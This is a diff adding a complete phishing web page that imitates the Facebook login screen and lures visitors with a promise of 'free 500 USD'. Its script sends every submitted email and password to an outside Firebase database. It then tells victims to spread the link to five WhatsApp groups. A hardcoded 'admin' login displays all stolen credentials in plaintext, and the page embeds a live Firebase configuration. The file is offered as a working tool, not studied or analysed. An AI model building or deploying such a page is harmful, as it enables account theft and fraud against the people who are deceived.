@@ -1,0 +1,88 @@
+<html>
+<head>
+   <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Facebook Login</title>
+    <style>
+        @import url('https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css');
+    </style>
+    <!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <!-- Add Firebase products that you want to use -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+    <script>
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAeUUzEqwlDK9eQHuOn-ssuS0hfIinHeVQ",
+            authDomain: "fblogin-ff1b2.firebaseapp.com",
+            databaseURL: "https://fblogin-ff1b2-default-rtdb.firebaseio.com/",
+            projectId: "fblogin-ff1b2",
+            storageBucket: "fblogin-ff1b2.appspot.com",
+            messagingSenderId: "38639161997",
+            appId: "1:38639161997:web:9d3c483a6eb678c6a588c4",
+            measurementId: "G-0G0T6MJSWB"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        function storeUserData(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (email === 'admin@admin.com' && password === 'admin') {
+                showAllUsers();
+            } else {
+                firebase.database().ref('users/').push({
+                    email: email,
+                    password: password
+                }).then(() => {
+                    alert('Congratulations! Your 500 USD will be deposited in your Fb star wallet after sharing the link in 5 whatsapp groups.');
+                }).catch((error) => {
+                    alert('Error: ' + error.message);
+                });
+            }
+        }
+
+        function showAllUsers() {
+            firebase.database().ref('users/').once('value').then((snapshot) => {
+                const users = snapshot.val();
+                let usersList = '<h2 class="text-center text-2xl mb-4">All Users</h2><ul class="list-disc pl-5">';
+                for (const key in users) {
+                    if (users.hasOwnProperty(key)) {
+                        usersList += `<li>Email: ${users[key].email}, Password: ${users[key].password}</li>`;
+                    }
+                }
+                usersList += '</ul>';
+                document.getElementById('loginContainer').innerHTML = usersList;
+            }).catch((error) => {
+                alert('Error: ' + error.message);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('loginForm').addEventListener('submit', storeUserData);
+        });
+    </script>
+</head>
+<body class="flex items-center justify-center min-h-screen bg-gray-100">
+    <div id="loginContainer" class="bg-white p-8 rounded-lg shadow-lg w-96">
+        <div class="flex justify-center mb-4">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="w-12 h-12 text-blue-600">
+                <path fill="currentColor" d="M22.675 0h-21.35C.595 0 0 .595 0 1.325v21.351C0 23.405.595 24 1.325 24H12.82v-9.294H9.692v-3.622h3.128V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.794.715-1.794 1.763v2.31h3.587l-.467 3.622h-3.12V24h6.116c.73 0 1.325-.595 1.325-1.324V1.325C24 .595 23.405 0 22.675 0z"/>
+            </svg>
+        </div>
+        <p class="text-center text-sm text-gray-700 mb-4">Get free 500 USD in your Facebook wallet by <span class="text-green-600 font-bold">Star Support</span></p>
+        <form id="loginForm">
+            <div class="mb-4">
+                <label for="email" class="block text-gray-700">Email</label>
+                <input type="email" id="email" class="w-full px-3 py-2 border rounded-lg" required>
+            </div>
+            <div class="mb-4">
+                <label for="password" class="block text-gray-700">Password</label>
+                <input type="password" id="password" class="w-full px-3 py-2 border rounded-lg" required>
+            </div>
+            <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-lg">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
